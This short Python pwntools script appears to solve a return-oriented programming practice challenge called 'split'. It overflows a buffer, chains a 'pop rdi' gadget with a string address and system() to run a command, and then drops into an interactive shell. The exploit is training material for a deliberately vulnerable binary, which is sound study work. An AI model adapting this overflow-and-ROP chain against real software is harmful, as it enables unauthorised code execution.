import pwn

#pwn.context.log_level = "debug"
remote = False

IP = ""
PORT = ""
FILENAME = "./split"

if remote:
    p = pwn.remote(IP, PORT)
    elf = pwn.ELF(FILENAME)
else:
    p = pwn.process(FILENAME)
    elf = p.elf

pwn.context.bits = 64

cat = pwn.pack(elf.sym["usefulString"])
pop_rdi = pwn.pack(0x00000000004007c3) # pop rdi; ret;
payload = b"A"*40 + pop_rdi + cat + pwn.pack(elf.sym["system"])

p.recvuntil("> ")
pwn.pause()
p.sendline(payload)

p.interactive()
